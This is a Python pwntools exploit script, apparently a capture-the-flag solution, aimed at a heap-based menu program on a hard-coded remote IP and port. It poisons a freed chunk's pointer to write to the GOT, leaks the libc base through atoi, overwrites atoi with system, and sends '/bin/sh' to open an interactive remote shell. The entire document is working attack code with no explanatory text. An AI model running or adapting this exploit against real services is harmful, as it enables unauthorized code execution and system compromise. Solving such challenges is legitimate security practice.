from pwn import *

r = remote("51.68.189.144", 31005)
# r = remote("35.243.188.20", 2000)
# r = remote("127.0.0.1", 8888)
context.arch = "amd64"

def new():
	r.recvuntil("> ")
	r.sendline("1")

def edit(data):
	r.recvuntil("> ")
	r.sendline("2")
	r.recvuntil("? ")
	r.send(data)

def show():
	r.recvuntil("> ")
	r.sendline("3")
	r.recvuntil(": ")
	return r.recvline()[:-1]

def delete():
	r.recvuntil("> ")
	r.sendline("4")

def magic(data):
	r.recvuntil("> ")
	r.sendline("1337")
	r.recvuntil("Fill ")
	r.send(data)	

atoi_got = 0x602060

new()
delete()
edit(p64(0x60209d))
new()
magic("\x00" * 0x2b + p64(atoi_got))

# leak libc base
atoi_off = 0x38db0
libc = u64(show().ljust(8, "\x00")) - atoi_off
print("libc : " + hex(libc))

# overwrite atoi() with system()
system_off = 0x47dc0
system = libc + system_off
edit(p64(system))

# atoi("/bin/sh\x00") => system("/bin/sh\x00")
r.recvuntil("> ")
r.send("/bin/sh\x00")

r.interactive()

